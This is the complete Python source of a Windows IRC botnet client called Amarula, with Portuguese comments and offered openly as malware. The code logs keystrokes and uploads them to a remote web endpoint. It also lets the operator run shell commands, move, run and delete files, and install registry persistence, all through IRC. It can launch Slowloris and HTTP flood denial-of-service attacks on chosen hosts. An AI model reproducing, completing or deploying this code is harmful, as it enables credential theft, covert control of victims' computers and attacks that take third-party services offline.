#!/usr/bin/python
# -*-coding:utf-8-*-
# coder: _carlosnericorreia_(badfly)
# email: hackerama@protonmail.com
# Amarula iRC Botnet v1.0 - Abacatch Version



#######################################################################################################################
#                                                                                                                     #
# -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
#                                                  Plum Version                                                   #
#                                                                                                                     #
#######################################################################################################################

import glob                                       # Funcao listArq()
import multiprocessing                            # funcao main(), keylog()
import os                                         # Funcoes deleteFile(), listArq(), upload(),
import platform                                   # Variavel pcName
import pyHook, pythoncom                          # Funcoes keylog(), onKey(event)
import random                                     # Variavel pcName
import requests                                   # Funcao upload()
import re                                         # Funcao getPublicIp()
import socket                                     # Funcoes  conn(), ipLocal()
import ssl
import subprocess                                 # Funcao run()
import sys                                        # Opcao matar
from urllib import urlopen                        # Funcao getPublicIp()
import urllib,urllib2                             # Funcao download()
import time                                       # Funcoes listArq(), shell(), main()
import threading                                  # Funcao onKey(event)
from multiprocessing.forking import freeze_support

# --------------------------------------------------------------------------------------------------------------------#
#                                              C O N F I G U R A C O E S                                              #
# --------------------------------------------------------------------------------------------------------------------#

ircServer= "irc.underworld.no"                             # Endereco do servidor IRC.
ircChannel= "#amarula424217"                                  # Canal ao qual o Zumbi ira se conectar.
channelPwd= ""                                   # Password do canal, caso nao haja, deixar em branco.
masterName= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
botPass= "raise"                                           # Password para se conectar aos bots no canal
urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"                # Array PHP que ira receber os arquivos via upload
urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
ldir = os.getcwd()+'\storage'                                      # Pasta onde sera salvo o arquivo de log local no cliente
window = None                                              # Funcao onKey(event) para capturar o nome da janela
data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
dump = []                                                  # Contador de caracteres, com 100 sobe o log pro Server
date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") # Data e hora no cabecalho de janelo no log.txt
pcname = platform.node()                                   # Nome do PC
pcos = platform.platform()                                 # Nome do OS
pcprocess = platform.processor()                           # Descricao do Processador
fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC
list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
]

# --------------------------------------------------------------------------------------------------------------------#
#                                        F U N C O E S   O P E R A C I O N A I S                                      #
# --------------------------------------------------------------------------------------------------------------------#

def conn():
    # Inicia a conexao com o IRC

    try:
        ircSock.connect((ircServer, 6665)) #6667
    except socket.error:
        conn()
    else:
        ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
        ircSock.send(str.encode("NICK "+ botNick +"\n"))


def deleteFile():
    # Deleta um arquivo

    try:
        localisfile = glob.glob(delFile)
        if os.path.exists(delFile):
            for localisfile in localisfile:
                os.unlink(localisfile)
                msgSend(ircChannel, "[+] Arquivo deletado com sucesso  " + "[ " + localisfile + " ] [+]")
        else:
            msgSend(ircChannel, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
    except WindowsError:
        msgSend(ircChannel, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
        msgSend(ircChannel, str(WindowsError))

def download():
    # Faz o download de um arquivo via requisicao HTTP

    if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
        try:
            file_name = urlDown.split('/')[-1]
            u = urllib2.urlopen(urlDown)
            f = open(file_name, 'wb')
            meta = u.info()
            file_size = int(meta.getheaders("Content-Length")[0])
            msgSend(ircChannel, "[+] Baixando para o bot: %s - Tamanho: %s Bytes [+]" % (file_name, file_size))
            f.write(u.read())
            f.close()
            msgSend(ircChannel, "[+] Download finalizado de: " + str(file_name) + " [+]")
        except IOError:
            msgSend(ircChannel, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
    else:
        msgSend(ircChannel, "Ops! Tente usar [http://] ou [https://] na URL")


def getPublicIp():
    # Obtem o IP publico do zumbi

    dataIp = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(dataIp).group(1)

def ipLocal():
    # Obtem o IP local do zumbi

    addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
    return addresses

def keylog():
# Funcao principal do keylogger

	global ldir

	try:
		os.mkdir(ldir)
	except Exception as e:
		print 'Excecao:', e
		pass

	file = open(ldir + '\capt-' + pcname + '.txt', 'a')
	file.write('\n[+]'+('-'*64+'[+]\n'))
	file.write('   AbaCatch Keylogger v1.0\n   _Ora, ora, parece que temos um xeroque rolmes aqui_\n\n')
	file.write('   DATA E HORA: ' + date + '\n')
	file.write('   NOME DO USUARIO: ' + pcname + '\n')
	file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
	file.write('   PROCESSADOR: ' + pcprocess + '\n')
	file.write('[+]' + ('-'*64 + '[+]\n'))
	file.close()

	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = onkey
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()


def listArq():
    # Lista os arquivos do diretorio atual

    file = glob.glob('*.*')

    for file in file:
        msgSend(ircChannel, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
        time.sleep(0.8)

def onkey(event):
# Funcao qee sera chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.

    global head
    global data
    global window
    global dump
    global ldir

    file = open(ldir + '\capt-' + pcname + '.txt', 'a')

    if event.WindowName != window:
        window = event.WindowName
        head = '\n\n[+] ' + window + ' - ' + date + '\n\n'
        file.write(head)

    if event.Ascii == 13:
        data = ' <ENTER>\n'
        file.write(data)
    elif event.Ascii == 8:
        data = ' <BACK SPACE> '
        file.write(data)
    elif event.Ascii == 9:
        data = ' <TAB>'
        file.write(data)
    else:
        data = chr(event.Ascii)
        file.write(data)
        file.close()

    dump.append(data)

    if len(dump) > 100:
        # print ('tamanho de dump:', len(dump))
        t = threading.Thread(target=upload2, args=(fileup,))
        t.daemon = True
        t.start()
        dump = []
        return dump

def persis():
    # Cria uma persistencia no registro do Windows

    try:
        conv = os.path.realpath(__file__).replace('.py', '.exe')
        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Amarula /t REG_SZ /f /d '+"'"+conv+"'", shell=True)
        msgSend(ircChannel, "[+] Registro alterado com sucesso [+]")
    except:
        msgSend(ircChannel, "[+] Nao foi possivel alterar o registro [+]")

def plumDos(threads, host, port):
    global headers, UsAg

    #UsAg = UserAgent()

    #fp = open("C:\Users\Usuario\Desktop\AmarProject\headers.txt", "r")
    headers = """Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-us,en
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8
Keep-Alive: 115
Connection: keep-alive"""

   # headers = fp.read()
    print headers
    #fp.close()
    while True:
        for i in range(threads):
            th = threading.Thread(target=TakeDown, args=(host, port,), name="User-" + str(1))
            th.Daemon = True  # thread dies if it exits!
            th.start()
            th.join()  # attack sequential

def run():
    # Executa um arquivo no cliente

    if os.path.isfile(str(fileRun)) == True:
        subprocess.call(['start', fileRun], shell=True)
        msgSend(ircChannel, fileRun + " executado com sucesso.")
    else:
        msgSend(ircChannel, fileRun + " arquivo nao existe.")

def shell():
    # Habilita comandos shell

    try:
        process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
        outt = (process.communicate())
        out2 = outt[0]
        out3 = out2.split('\r\n')
        for item in (out3):
            item = item.replace("\x82", "?")
            item = item.replace("\xc6", "?")
            item = item.replace("\xa3", "?")
            item = item.replace("\xa1", "?")
            item = item.replace("\xa2", "?")
            item = item.replace("\x87", "?")
            item = item.replace("\x93", "?")
            item = item.replace("\xa0", "?")
            item = item.replace("\x88", "?")
            item = item.replace("\x83", "?")
            item = item.replace("\xc7", "?")
            item = item.replace("\xb8", "?")
            item = item.replace("\xad", "?")
            item = item.replace("\xef", "?")
            item = item.replace("\xa7", "?")
            item = item.replace("\xf5", "?")
            item = item.replace("\xf0", "?")
            item = item.replace("\xfc", "?")
            item = item.replace("\xa6", "?")
            msgSend(ircChannel, item )
            time.sleep(1)
    except:
        msgSend(ircChannel, "[!] Ocorreu um erro na execucao do comando [!]")
    ###################################################################################################


def init_socket(ip, sport):
    UsAg = UserAgent()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if sport == 443:
        s = ssl.wrap_socket(s)
    s.connect((ip, sport))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    #print random.choice(user_agents)
    s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def slowLoris(ip, socket_count, sport):
# Slowloris attack

    for _ in range(socket_count):
        try:
            s = init_socket(ip,sport)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            try:
                s = init_socket(ip, sport)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

def TakeDown(host,port):
    UsAg = UserAgent()
    print UsAg
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error:
        msgSend(ircChannel, "Error:")
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            #print"Could not resolve hostname."
            sys.exit()
        else:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\nUser-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
            #print packet
            if sock.connect_ex((host,port)) == 0:
                if sock.sendall(packet) == None:
                    #print"Packet sent successfuly!"
                    sock.close()
                else:
                    print"Error while sending!"
                    sys.exit()

def UserAgent():
    userAg=[]
    for line in user_agents:
        userAg.append(line)
    return userAg

def upload():
    # Faz o upload de um arquivo do cliente para um servidor HTTP

    global urlUpload, urlStrip

    if os.path.exists(fileUp):
        files = {'file': open(fileUp, 'rb')}
        r = requests.post(urlUpload, files=files) #import requests
        msgSend(ircChannel, "[+] Upload concluido com sucesso [+] para http:"+urlStrip + fileUp)
    else:
        msgSend(ircChannel, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")

def upload2(fileup):
    # funcao responsavel pelo upload do arquivo de log para o servidor
    global urlUpload

    if os.path.exists(fileup):
        files = {'file': open(fileup, 'rb')}
        requests.post(urlUpload, files=files)

# --------------------------------------------------------------------------------------------------------------------#
#                                          F U N C O E S   A U X I L I A R E S                                        #
# --------------------------------------------------------------------------------------------------------------------#

def ping():
    ircSock.send (str.encode("PONG :pingis\n"))

def msgSend(chan, msg):
    ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))

def join(chan):
    ircSock.send(str.encode("JOIN " + chan + " " + channelPwd + "\n"))

def leaveChannel(chan):
    ircSock.send(str.encode("PART " + chan + " leaving the canal" + "\n"))

def quitIrc(chan):
    ircSock.send(str.encode("QUIT" + "\n"))


# --------------------------------------------------------------------------------------------------------------------#
#                                            F U N C A O   P R I N C I P A L                                          #
# --------------------------------------------------------------------------------------------------------------------#

def main():
    #Funcao Principal

    global masterName, ldir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
    ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #time.sleep(40) # Esperar a inicializacao do network card (uncomment to use)

    conn()
    join(ircChannel)
    login = False

    while login != True:
        ircMsg = ircSock.recv(5000)
        ircMsgClean = ircMsg.strip(str.encode('\n\r'))
        ircSock.send(str.encode("NICK " + botNick + "\n"))
        print(ircMsgClean)
        if ircMsg.find(ircMsg.replace("PING ", "PONG")) !=-1:
            ping()
        if ircMsg.find(str.encode("login")) !=-1:
            try:
                p = ircMsgClean.split()
                pwd = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] tente: <login> <senha>")
            else:
                if pwd != botPass:
                    msgSend(ircChannel, "[!] Parado! Senha Invalida, ou voce nao pode logar [!]")
                else:
                    msgSend(ircChannel, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
                    login = True

    while True:
        ircMsg = ircSock.recv(5000)
        ircMsgClean = ircMsg.strip(str.encode('\n\r'))

        print(ircMsgClean)
        if ircMsg.find(str.encode("Nickname is already in use")) != -1:
            botNick = pc_name + str(random.randint(1,10000))
            ircSock.send(str.encode("NICK "+ botNick +"\n"))
            join(ircChannel)

        elif ircMsg.find(str.encode("slow start")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[8]
                tmp2 = p[5]
                socket_count = int(float(tmp2))
                ip = p[6]
                tmp3 = p[7]
                sport = int(float(tmp3))
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow start> <socket count> <ip> <port> [<" + botNick +"> ou <wave>]"")
            except ValueError:
                pass
            else:
                if id == botNick or id == 'wave':
                    pr = multiprocessing.Process(target=slowLoris, args=(ip, socket_count,sport))
                    pr.daemon = True
                    pr.start()
                    msgSend(ircChannel, "[+] Slowloris iniciado [+]")

        elif ircMsg.find(str.encode("slow stop")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow stop> <" + botNick +">")
            else:
                if id == botNick or id == 'wave':
                    for p in multiprocessing.active_children():
                        p.terminate()
                        msgSend(ircChannel, "[+] Slowloris terminado [+]")


        elif ircMsg.find(str.encode("plum start")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[8]
		tmp = p[5]
                threads = int(tmp)
                host = p[6]
                port = int(p[7])

            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <plum start> <threads> <ip> <port> [<" + botNick +"> ou <wave>]")
            except ValueError:
                pass
            else:
                if id == botNick or id == 'wave':
                    pr = multiprocessing.Process(target=plumDos, args=(threads, host, port))
                    pr.daemon = True
                    pr.start()
                    msgSend(ircChannel, "[+] Plum iniciado [+]")

        elif ircMsg.find(str.encode("plum stop")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <plum stop> [<" + botNick +"> ou <wave>]")
            else:
                if id == botNick or id == 'wave':
                    for p in multiprocessing.active_children():
                        p.terminate()
                        msgSend(ircChannel, "[+] Plum terminado [+]")


        elif ircMsg.find(str.encode("keylog start")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <keylog start> [<" + botNick +"> ou <wave>]")
            else:
                if id == botNick or id == 'wave':
                    pr = multiprocessing.Process(target=keylog)
                    pr.daemon = True
                    pr.start()
                    msgSend(ircChannel, "[+] Keylogger ativado [+]")

        elif ircMsg.find(str.encode("keylog stop")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <keylog stop> [<" + botNick +"> ou <wave>]")
            else:
                if id == botNick or id == 'wave':
                    for p in multiprocessing.active_children():
                        p.terminate()
                        msgSend(ircChannel, "[+] Keylogger desativado [+]")

        elif ircMsg.find(str.encode("PING :")) != -1:
            ping()

        elif ircMsg.find(str.encode("sair")) != -1:
            leaveChannel(ircChannel)

        elif ircMsg.find(str.encode("matar")) != -1:
            quitIrc(ircChannel)
            sys.exit()

        elif ircMsg.find(str.encode("help")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <help> <" + botNick +">")
            else:
                if id == botNick:
                    msgSend(ircChannel, "[+] Bem Vindo, Mestre " + masterName + " [+]")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [botnick]       para listar os nomes dos bots ativos")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [matar]         para matar os bots ativos")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [sair]          para que os bots ativos saiam do canal")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [dir]           para vizualizar o diretorio atual do zumbi")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [ls]            para listar o conteudo da pasta atual")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [ip]            para mostrar os ips do bot")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [upload]        para fazer upload de arquivos do bot")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [download]      para baixar arquivos para o zumbi")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [run]           para executar um programa")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [shell]         para executar comandos no terminal")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [delete]        para excluir arquivos")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [keylog start]  para ativar o keylogger")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [keylog stop]   para desativar o keylogger")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [slow start]    para ativar o ataque SLOWLORIS")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [slow stop]     para desativar o ataque SLOWLORIS")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [plum start]    para ativar o ataque SYN FLOOD")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [plum stop]     para desativar o ataque SYN FLOOD")
                    time.sleep(1)
                    msgSend(ircChannel, "use: [persistence]   para instalar persistencia no registro do Windows")

        elif ircMsg.find(str.encode("botnick")) != -1:
            msgSend(ircChannel, "Nickname: " + botNick)

        elif ircMsg.find(str.encode("dir")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <dir> <" + botNick +">")
            else:
                if id == botNick:
                    msgSend(ircChannel, "[+] Diretorio atual do zumbi: " + os.getcwd())

        elif ircMsg.find(str.encode("ls")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <ls> <" + botNick +">")
            else:
                if id == botNick:
                    listArq()

        elif ircMsg.find(str.encode("ip")) != -1:
            try:
                p = ircMsgClean.split()
                id = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <ip> <" + botNick +">")
            else:
                if id == botNick:
                    yx = getPublicIp()
                    xy = ipLocal()
                    msgSend(ircChannel, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )

        elif ircMsg.find(str.encode("upload")) != -1:
            try:
                p = ircMsgClean.split()
                fileUp = p[4]
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <upload> <Arquivo> <" + botNick +">")
            else:
                if fileUp == fileUp and id == botNick:
                    msgSend(ircChannel, "[+] Upload em andamento, aguarde um pouco. [+]")
                    upload()

        elif ircMsg.find(str.encode("download")) != -1:
            try:
                p = ircMsgClean.split()
                urlDown = p[4]
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <download> <link> <"+ botNick +">")
            else:
                if urlDown == urlDown and id == botNick:
                    download()

        elif ircMsg.find(str.encode("run")) != -1:
            try:
                p = ircMsgClean.split()
                fileRun = p[4]
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <run> <programa> <"+ botNick +">")
            else:
                if fileRun == fileRun and id == botNick:
                    run()

        elif ircMsg.find(str.encode("delete")) != -1:
            try:
                p = ircMsgClean.split()
                delFile = p[4]
                id = p[5]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <delete> <arquivo> <"+ botNick +">")
            else:
                if delFile == delFile and id == botNick:
                    deleteFile()

        elif ircMsg.find(str.encode("shell")) != -1:
            try:
                p = ircMsgClean.split()
                print (p)
                comando = p[4:-1]
                comando = " ".join(comando)
                print (comando)

                id = p[-1]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <shell> <comando> <" + botNick + ">")
            else:
                if comando == comando and id == botNick:
                    shell()

        elif ircMsg.find(str.encode("persistence")) != -1: # Para persistencia
            try:
                p = ircMsgClean.split()
                id = p[4]
            except IndexError:
                msgSend(ircChannel, "[+] Sintaxe [+] use: <persistence> <" + botNick +">")
            else:
                if id == botNick:
                    persis()

if __name__ == "__main__":
    freeze_support()
    main()
